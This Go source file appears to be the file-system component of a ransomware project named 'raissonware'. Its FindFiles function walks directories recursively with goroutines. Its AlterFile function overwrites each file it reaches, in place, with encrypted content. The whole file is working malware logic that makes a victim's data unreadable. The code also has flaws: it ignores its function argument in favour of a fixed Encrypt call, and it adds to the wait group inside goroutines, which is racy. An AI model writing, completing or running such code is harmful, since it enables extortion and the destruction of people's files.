package filesystem

import (
	"os"
	"path/filepath"
	"raissonware/pkg/cryptography"
	"sync"
)

// FindFiles recursively search for files and executes the EncryptFile function
func FindFiles(path string, exec func([]byte) ([]byte, error), wg *sync.WaitGroup, chanErr chan error) {
	defer wg.Done()
	wg.Add(1)

	files, err := os.ReadDir(path)
	if err != nil {
		chanErr <- err
		return
	}

	for _, file := range files {
		subPath := filepath.Join(path, file.Name())

		if file.IsDir() {
			go FindFiles(subPath, exec, wg, chanErr)
			continue
		}

		AlterFile(subPath, cryptography.Encrypt, wg, chanErr)
	}
}

func AlterFile(path string, exec func([]byte) ([]byte, error), wg *sync.WaitGroup, chanErr chan error) {
	defer wg.Done()
	wg.Add(1)

	fileInfo, err := os.Stat(path)
	if err != nil {
		chanErr <- err
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		chanErr <- err
		return
	}

	newData, err := exec(data)
	if err != nil {
		chanErr <- err
		return
	}

	err = os.WriteFile(path, newData, fileInfo.Mode())
	if err != nil {
		chanErr <- err
		return
	}
}